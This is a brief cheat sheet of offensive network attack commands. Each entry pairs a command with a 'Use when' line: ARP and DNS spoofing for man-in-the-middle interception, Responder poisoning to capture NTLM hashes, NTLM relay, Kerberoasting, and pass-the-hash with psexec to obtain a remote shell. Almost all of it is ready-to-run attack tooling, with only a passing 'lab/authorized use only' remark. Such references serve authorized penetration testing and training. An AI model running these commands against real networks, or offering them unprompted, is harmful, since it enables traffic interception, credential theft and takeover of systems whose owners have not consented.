# Specialized Hacking Techniques

### ARP spoofing with arpspoof

```
sudo arpspoof -i <interface> -t <target-ip> <gateway-ip>
```

**Use when:** Positioning yourself as MITM on a local network segment (lab/authorized use only).

---

### Enable IP forwarding for MITM

```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

**Use when:** Right before running an ARP spoof, so intercepted traffic still reaches its destination.

---

### DNS spoofing with ettercap

```
sudo ettercap -T -q -i <interface> -P dns_spoof -M arp:remote /<target-ip>// /<gateway-ip>//
```

**Use when:** Redirecting a target's DNS resolution as part of a MITM lab exercise.

---

### Responder for LLMNR/NBT-NS poisoning

```
sudo responder -I <interface> -wrf
```

**Use when:** On an internal Windows network — capturing NTLM hashes from broadcast name-resolution requests.

---

### Relay captured NTLM hashes

```
ntlmrelayx.py -tf targets.txt -smb2support
```

**Use when:** You've got Responder running and want to relay captured auth instead of just cracking it offline.

---

### Kerberoasting

```
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request
```

**Use when:** You have valid domain creds and want to request/crack service-account TGS tickets.

---

### Pass-the-hash with impacket

```
psexec.py -hashes <lmhash>:<nthash> <domain>/<user>@<target-ip>
```

**Use when:** You've got an NTLM hash and want a shell without needing the plaintext password.
